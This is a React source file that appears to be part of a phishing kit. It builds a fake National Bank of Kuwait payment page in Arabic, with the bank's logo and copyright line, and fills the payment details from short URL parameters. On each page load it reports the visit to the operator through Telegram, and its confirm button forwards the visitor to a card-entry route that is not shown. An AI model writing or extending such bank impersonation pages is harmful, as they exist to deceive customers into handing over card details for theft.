import { useParams, useNavigate } from "react-router-dom";
import { useEffect, useMemo } from "react";
import { sendMessageToTelegram } from "@/backend/telegramService";

const dummyPaymentData: Record<string, any> = {
  "123": {
    id: "123",
    customerName: "halits.YILDIZ",
    amount: 5.000,
    currency: "KWD",
    description: "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
    expiryDate: "2025-12-31",
    createdAt: "2025-06-19"
  }
};

const defaultPaymentData = {
  customerName: "halits.YILDIZ",
  amount: 5.000,
  currency: "KWD",
  description: "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
  expiryDate: "2025-08-20",
  createdAt: "2025-08-19"
};

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  const queryParams = new URLSearchParams(window.location.search);
  
  // Calculate dynamic expiry date (24 hours from now)
  const dynamicExpiry = useMemo(() => {
    const tomorrow = new Date();
    tomorrow.setHours(tomorrow.getHours() + 24);
    return tomorrow.toISOString().split('T')[0];
  }, []);
  
  const paymentData = {
    id: id || 'unknown',
    customerName: queryParams.get('n') || (dummyPaymentData[id as string]?.customerName || defaultPaymentData.customerName),
    amount: parseFloat(queryParams.get('a') || String(dummyPaymentData[id as string]?.amount || defaultPaymentData.amount)),
    currency: queryParams.get('c') || (dummyPaymentData[id as string]?.currency || defaultPaymentData.currency),
    description: queryParams.get('p') || (dummyPaymentData[id as string]?.description || defaultPaymentData.description),
    expiryDate: queryParams.get('e') || dynamicExpiry,
    createdAt: dummyPaymentData[id as string]?.createdAt || defaultPaymentData.createdAt
  };

  useEffect(() => {
    const notifyVisitor = async () => {
      const message = `
<b>👀 New Visitor on Payment Page</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount.toFixed(3)} ${paymentData.currency}
<b>Purpose:</b> ${paymentData.description}
<b>ID:</b> ${paymentData.id}
`;
      await sendMessageToTelegram(message);
    };
    notifyVisitor();
  }, []);

  const handleConfirm = () => {
    navigate(`/card/${id}${window.location.search}`);
  };

  if (!id || id.length < 3) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center p-8 bg-white rounded-xl shadow-lg">
          <div className="text-xl font-bold text-red-600 mb-4">لم يتم العثور على الطلب</div>
          <p className="text-gray-600 mb-6">عذراً، الرابط الذي تحاول الوصول إليه غير صالح</p>
        </div>
      </div>
    );
  }

  const getCurrencySymbol = (currency: string) => {
    const symbols: Record<string, string> = {
      'KWD': 'د.ك', 'USD': '$', 'EUR': '€', 'GBP': '£', 'SAR': 'ر.س', 'AED': 'د.إ'
    };
    return symbols[currency] || currency;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="mb-8">
        <img src="/nbk-logo.jpg" alt="NBK" className="h-16" />
      </div>
      
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
        خدمة الدفع السريع
      </h1>
      
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">اسم المستلم:</span>
            <span className="font-bold text-blue-900">{paymentData.customerName}</span>
          </div>
          
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">المبلغ:</span>
            <span className="font-bold text-blue-900">{paymentData.amount.toFixed(3)} {getCurrencySymbol(paymentData.currency)}</span>
          </div>
          
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">الغرض:</span>
            <span className="font-bold text-blue-900">{paymentData.description}</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="text-gray-700">تاريخ الانتهاء:</span>
            <span className="font-bold text-red-600">{paymentData.expiryDate}</span>
          </div>
        </div>
      </div>
      
      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
        يرجى التأكد من تفاصيل المعاملة أعلاه قبل المتابعة لعملية الدفع.
      </div>
      
      <div className="flex flex-col gap-3 w-full max-w-md">
        <button 
          onClick={handleConfirm}
          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-4 text-xl rounded-xl transition-all font-bold shadow-lg active:scale-95"
        >
          تأكيد
        </button>
      </div>

      <div className="mt-12 text-center text-xs text-gray-400">
        جميع الحقوق محفوظة © 2025 - بنك الكويت الوطني
      </div>
    </div>
  );
};

export default PaymentPage;
